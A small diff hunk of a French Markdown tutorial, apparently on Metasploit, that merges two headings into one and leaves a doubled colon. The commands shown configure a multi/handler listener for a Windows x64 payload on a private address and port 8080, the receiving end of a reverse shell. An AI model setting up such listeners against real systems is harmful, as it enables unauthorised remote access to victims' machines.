@@ -711,13 +711,11 @@ msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set payload windows/x64/
 ```
 
-Definir le Host Local :
+Definir le Host Local et le Port Local d'écoute : :
 
 ```bash
 msf6 exploit(multi/handler) > set lhost 192.168.88.18
 ```
-
-Definir le Port Local d'écoute :
 
 ```bash
 msf6 exploit(multi/handler) > set lport 8080
